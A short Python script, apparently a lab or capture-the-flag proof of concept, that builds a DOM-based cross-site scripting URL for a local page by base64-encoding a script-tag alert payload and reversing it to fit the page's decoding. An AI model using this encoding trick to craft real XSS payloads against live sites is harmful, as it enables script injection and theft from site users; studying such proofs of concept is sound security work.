import base64 

URL='http://127.0.0.1:8000/_message.html?'
# there is a character limit nonetheless (~1100 for the complete url)
PAYLOAD="""
<script>alert('DOM-based XSS')</script>
"""

PAYLOAD = ''.join(list(base64.b64encode(PAYLOAD.encode()).decode())[::-1])
print(URL + PAYLOAD)
